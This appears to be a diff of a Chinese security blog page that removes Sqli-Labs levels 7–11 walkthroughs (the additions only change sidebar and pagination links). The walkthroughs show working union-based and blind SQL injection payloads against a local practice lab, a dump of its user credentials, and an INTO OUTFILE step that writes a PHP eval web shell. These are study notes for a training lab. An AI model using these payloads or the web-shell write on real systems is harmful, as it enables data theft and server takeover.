-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs11/" class="article-date">
-  <time datetime="2020-04-06T05:37:09.021Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs11/">Sqli-Labs-Level11学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h1><p>创建日期 星期日 18 十一月 2018</p>
-<p><a href="http://127.0.0.1/SQL/Less-11/index.php" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-11/index.php</a><br><img src="https://s1.ax1x.com/2020/04/06/Gs2TT1.png" alt></p>
-<p>输入admin，密码111111<br><img src="https://s1.ax1x.com/2020/04/06/Gs2bY6.png" alt></p>
-<p>当输入admin’# ，密码任意。<br>返回<br><img src="https://s1.ax1x.com/2020/04/06/Gs2OSO.png" alt></p>
-<p>用户名输入 test’ order by 2# ，密码任意<br>返回<br><img src="https://s1.ax1x.com/2020/04/06/Gs2HFx.png" alt></p>
-<p>密码输入test’ order by 3#<br><img src="https://s1.ax1x.com/2020/04/06/Gs2owR.png" alt></p>
-<p>得到字段为2 </p>
-<p>用户名输入test’ union select 1,database()#，密码任意</p>
-<p>得到<br><img src="https://s1.ax1x.com/2020/04/06/Gs2qfK.png" alt></p>
-<p>得到数据库security</p>
-<hr>
-<p>用户名输入test’ union select version(),database()#，密码任意，得到<br><img src="https://s1.ax1x.com/2020/04/06/Gs2j6e.png" alt></p>
-<p>uname=test’ union select 1,(select schema_name from information_schema.schemata limit 0,1)#&amp;passwd=1&amp;submit=Submit<br>得到数据库information_schema<br><img src="https://s1.ax1x.com/2020/04/06/Gs2vOH.png" alt></p>
-<p>uname=test’ union select 1,(select schema_name from information_schema.schemata limit 1,1)#&amp;passwd=1&amp;submit=Submit<br>得到数据库：challenges</p>
-<p>uname=test’ union select 1,(select schema_name from information_schema.schemata limit 2,1)#&amp;passwd=1&amp;submit=Submit<br>得到数据库mysql</p>
-<p>uname=test’ union select 1,(select schema_name from information_schema.schemata limit 3,1)#&amp;passwd=1&amp;submit=Submit<br>得到数据库performance_schema</p>
-<p>uname=test’ union select 1,(select schema_name from information_schema.schemata limit 4,1)#&amp;passwd=1&amp;submit=Submit<br>得到数据库security</p>
-<p>uname=test’ union select 1,(select schema_name from information_schema.schemata limit 5,1)#&amp;passwd=1&amp;submit=Submit<br>得到数据库test</p>
-<p>也可以执行<br>uname=test’ union select 1,(select group_concat(schema_name) from information_schema.schemata)#&amp;passwd=1&amp;submit=Submit<br>得到数据库名：information_schema,challenges,mysql,performance_schema,security,test</p>
-<hr>
-<p>获取表名。</p>
-<p>uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)#&amp;passwd=1&amp;submit=Submit<br>得到表名 emails</p>
-<p>uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 1,1)#&amp;passwd=1&amp;submit=Submit<br>得到表名referers</p>
-<p>uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 2,1)#&amp;passwd=1&amp;submit=Submit<br>得到表名uagents</p>
-<p>uname=test’ union select 1,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1)#&amp;passwd=1&amp;submit=Submit<br>得到表名users</p>
-<p>也可以执行<br>uname=test’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)#&amp;passwd=1&amp;submit=Submit<br>得到所有的表（security）：<br>emails,referers,uagents,users<br><img src="https://s1.ax1x.com/2020/04/06/Gs2zmd.png" alt></p>
-<hr>
-<p>获取字段名。</p>
-<p>uname=test’ union select 1,(select column_name from information_schema.columns where table_name=’users’ limit 0,1)#&amp;passwd=1&amp;submit=Submit<br>得到字段id</p>
-<p>uname=test’ union select 1,(select column_name from information_schema.columns where table_name=’users’ limit 1,1)#&amp;passwd=1&amp;submit=Submit<br>得到字段username</p>
-<p>uname=test’ union select 1,(select column_name from information_schema.columns where table_name=’users’ limit 2,1)#&amp;passwd=1&amp;submit=Submit<br>得到字段password</p>
-<p>也可以执行<br>uname=test’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’)#&amp;passwd=1&amp;submit=Submit<br>得到id,username,password</p>
-<hr>
-<p>获取数据。</p>
-<p>uname=test’ union select 1,(select group_concat(id,’|’,username,’|’,password) from users)#&amp;passwd=1&amp;submit=Submit<br>得到<br>1|Dumb|Dumb,<br>2|Angelina|I-kill-you,<br>3|Dummy|p@ssword,<br>4|secure|crappy,<br>5|stupid|stupidity,<br>6|superman|genious,<br>7|batman|mob!le,<br>8|admin|admin,<br>9|admin1|admin1,<br>10|admin2|admin2,<br>11|admin3|admin3,<br>12|dhakkan|dumbo,<br>14|admin4|admin4</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs11/" data-id="ck8o2c3ax00048ch55y302q7k" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs10" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs10/" class="article-date">
-  <time datetime="2020-04-06T05:36:47.916Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs10/">Sqli-Labs-Level10学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h1><p>创建日期 星期日 18 十一月 2018</p>
-<p>基于时间，双引号。</p>
-<p><a href="http://127.0.0.1/SQL/Less-10/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-10/index.php?id=1</a><br>Welcome    Dhakkan<br>You are in………..</p>
-<p><a href="http://127.0.0.1/SQL/Less-10/index.php?id=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-10/index.php?id=1&quot;</a><br>Welcome    Dhakkan<br>You are in………..</p>
-<p><a href="http://127.0.0.1/SQL/Less-10/index.php?id=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-10/index.php?id=1&quot;</a> and if(ascii(substr(database(),1,1))=100,1,sleep(5))–+<br>等待五秒返回</p>
-<p><a href="http://127.0.0.1/SQL/Less-10/index.php?id=1&quot;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-10/index.php?id=1&quot;</a> and if(ascii(substr(database(),1,1))=115,1,sleep(5))–+<br>正常返回</p>
-<p>则第一位为115，即s, 其他以此类推。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs10/" data-id="ck8o2c3ag00008ch5d1joad1m" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs9" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs9/" class="article-date">
-  <time datetime="2020-04-06T05:36:16.621Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs9/">Sqli-Labs-Level9学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h1><p>创建日期 星期六 17 十一月 2018</p>
-<p>基于时间，单引号。</p>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1</a><br>返回<br>Welcome    Dhakkan<br>You are in………..</p>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a><br>返回<br>Welcome    Dhakkan<br>You are in………..</p>
-<p>时间盲注</p>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a> and if(ascii(substr(database(),1,1))=22,1,sleep(5))–+</p>
-<p>等待五秒返回。</p>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a> and if(ascii(substr(database(),1,1))=115,1,sleep(5))–+<br>立即返回<br>得到第一个字符的ascii为115 ，即s</p>
-<p>依次类推得到数据库名为security</p>
-<hr>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a> and if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+</p>
-<p>正常返回 则表名第一位为101 即e</p>
-<p>其他数字如100<br><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a> and if(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=100,1,sleep(5))–+</p>
-<p>则五秒后返回页面。</p>
-<p>最终得到表名为emails</p>
-<hr>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a> and if(ascii(substr((select column_name from information_schema.columns where table_name=’emails’ limit 0,1),1,1))=101,1,sleep(5))–+</p>
-<p>等待五秒返回页面。</p>
-<p><a href="http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-9/index.php?id=1&#39;</a> and if(ascii(substr((select column_name from information_schema.columns where table_name=’emails’ limit 0,1),1,1))=105,1,sleep(5))–+<br>正常返回，得到字段id为105，即i</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs9/" data-id="ck8o2c3cq00308ch52z4w1x02" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs8" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs8/" class="article-date">
-  <time datetime="2020-04-06T05:35:49.163Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs8/">Sqli-Labs-Level8学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h1><p>创建日期 星期六 17 十一月 2018</p>
-<p><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1</a><br>返回<br>Welcome    Dhakkan<br>You are in………..</p>
-<p><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a></p>
-<p>返回<br>Welcome    Dhakkan</p>
-<p><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a> order by 3–+<br>返回<br>Welcome    Dhakkan<br>You are in………..</p>
-<p><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a> order by 4–+<br>返回<br>Welcome    Dhakkan</p>
-<p>因此字段为3</p>
-<p>mysql的if函数。<br>格式：IF(Condition,A,B)<br>意义：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。</p>
-<p><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a> and if (ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
-<p>直接返回<br>Welcome    Dhakkan<br>You are in………..</p>
-<p>得到数据库第一位为115，即s</p>
-<p>如果不等于则会sleep 5秒。</p>
-<p>依次类推可得到完整数据库名。</p>
-<p>也可以使用布尔型注入。<br><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a> and length(database())=1–+<br>…<br><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a> and length(database())=7–+<br>均返回Welcome    Dhakkan </p>
-<p><a href="http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-8/index.php?id=1&#39;</a> and length(database())=8–+<br>则返回<br>Welcome    Dhakkan<br>You are in………..</p>
-<p>说明数据库长度是8 。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs8/" data-id="ck8o2c3cp002z8ch57gcm296i" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sqli-labs7" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs7/" class="article-date">
-  <time datetime="2020-04-06T05:33:16.820Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs7/">Sqli-Labs-Level7学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h1><p>创建日期 星期日 14 十月 2018</p>
-<p>看代码，来闭合。</p>
-<p><a href="http://127.0.0.1/sql/Less-7/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-7/index.php?id=1&#39;</a><br>Welcome    Dhakkan<br>You have an error in your SQL syntax</p>
-<p><a href="http://127.0.0.1/sql/Less-7/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-7/index.php?id=1&#39;</a>) or 1=1–+<br>Welcome    Dhakkan<br>You have an error in your SQL syntax</p>
-<p><a href="http://127.0.0.1/sql/Less-7/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-7/index.php?id=1&#39;</a>)) or 1=1–+<br>Welcome    Dhakkan<br>You are in…. Use outfile……</p>
-<p><a href="http://127.0.0.1/sql/Less-7/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-7/index.php?id=1&#39;</a>)) order by 3–+<br>Welcome    Dhakkan<br>You are in…. Use outfile……</p>
-<p><a href="http://127.0.0.1/sql/Less-7/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-7/index.php?id=1&#39;</a>)) order by 4–+<br>Welcome    Dhakkan<br>You have an error in your SQL syntax </p>
-<p>得到当前表字段为3</p>
-<p>写文件，这里写入一句话木马：</p>
-<p><a href="http://127.0.0.1/SQL/Less-7/index.php?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-7/index.php?id=1&#39;</a>)) UNION SELECT 1,2,”<?php @eval($_POST['cmd']);?>“ into outfile “D:\phpStudy\PHPTutorial\WWW\shell1.php”–+</p>
-<p>返回<br>Welcome    Dhakkan<br>You have an error in your SQL syntax </p>
-<p>写入的文件：<br><img src="https://i.loli.net/2020/04/06/VYezSdCi4rTxkHa.png" alt><br><img src="https://i.loli.net/2020/04/06/TG61YyLzSUkjc7b.png" alt><br><img src="https://i.loli.net/2020/04/06/z6ac8F9VvdtWYSA.png" alt></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs7/" data-id="ck8o2c3c7001t8ch559ty73es" class="article-share-link">Share</a>
+      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs25/" data-id="ck8o2c3bu001a8ch59jo5e0zz" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
@@ -626,7 +677,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -666,7 +717,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li></ul>
     </div>
   </div>
 
@@ -679,23 +730,23 @@
       <ul>
         
           <li>
-            <a href="/2020/04/06/sqli-labs26/">Sqli-Labs-Level26学习</a>
+            <a href="/2020/05/04/sqli-labs40/">Sqli-Labs-Level40学习</a>
           </li>
         
           <li>
-            <a href="/2020/04/06/sqli-labs25/">Sqli-Labs-Level25学习</a>
+            <a href="/2020/05/04/sqli-labs39/">Sqli-Labs-Level39学习</a>
           </li>
         
           <li>
-            <a href="/2020/04/06/sqli-labs24/">Sqli-Labs-Level24学习</a>
+            <a href="/2020/05/04/sqli-labs38/">Sqli-Labs-Level38学习</a>
           </li>
         
           <li>
-            <a href="/2020/04/06/sqli-labs23/">Sqli-Labs-Level23学习</a>
+            <a href="/2020/05/04/sqli-labs37/">Sqli-Labs-Level37学习</a>
           </li>
         
           <li>
-            <a href="/2020/04/06/sqli-labs22/">Sqli-Labs-Level22学习</a>
+            <a href="/2020/05/04/sqli-labs36/">Sqli-Labs-Level36学习</a>
           </li>
         
       </ul>
